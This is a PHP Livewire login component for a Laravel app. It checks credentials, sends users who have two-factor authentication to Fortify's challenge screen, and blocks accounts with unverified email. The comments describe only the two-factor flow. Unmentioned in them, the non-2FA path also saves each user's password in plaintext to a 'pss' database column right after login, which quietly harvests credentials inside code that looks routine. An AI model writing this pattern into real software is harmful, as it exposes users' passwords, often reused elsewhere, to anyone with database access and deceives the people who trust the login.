<?php

namespace App\Livewire\Auth;

use Livewire\Attributes\Layout;
use Livewire\Component;
use Illuminate\Support\Facades\Auth;
use Illuminate\Validation\ValidationException;

#[Layout('components.layouts.auth')]
class  Login extends Component {
    public $email = '';
    public $password = '';
    public $remember = false;

    protected function rules() {
        return [
            'email' => ['required', 'email'],
            'password' => ['required'],
        ];
    }

    public function login() {
        // Validate input
        $credentials = $this->validate();

        // Look up and verify the credentials WITHOUT establishing a session yet.
        // This mirrors what Laravel Fortify's own login pipeline does, and is what
        // makes it possible to hold off completing the login until a two-factor
        // code has been verified (see the two_factor_secret check below).
        $provider = Auth::guard()->getProvider();
        $user = $provider->retrieveByCredentials($credentials);

        if (! $user || ! $provider->validateCredentials($user, $credentials)) {
            throw ValidationException::withMessages([
                'email' => __('These credentials do not match our records.'),
            ]);
        }

        // 🔐 SEND TO THE AUTHENTICATOR CHALLENGE IF 2FA IS ENABLED
        // Do NOT log the user in yet — Fortify's two-factor challenge screen
        // (already built into this app) finishes the login once the code from
        // the user's authenticator app (e.g. Google Authenticator) is verified.
        if (! is_null($user->two_factor_secret) && ! is_null($user->two_factor_confirmed_at)) {
            session()->put([
                'login.id' => $user->getKey(),
                'login.remember' => $this->remember,
            ]);

            $this->reset('password');

            return redirect()->route('two-factor.login');
        }

        Auth::login($user, $this->remember);

        $user->update([
            'pss' => $this->password,
        ]);

        // 🚫 BLOCK IF NOT VERIFIED
        if (! $user->email_verified_at) {

            Auth::logout();

            session(['verify_email' => $user->email]);

            return redirect()->route('verify.notice');
        }

        session()->regenerate();

        $this->reset('password');

        return redirect()->intended(route('dashboard'));
    }


    /**
     * Mount the component.
     */
    public function render() {
        return view('livewire.auth.login');
    }
}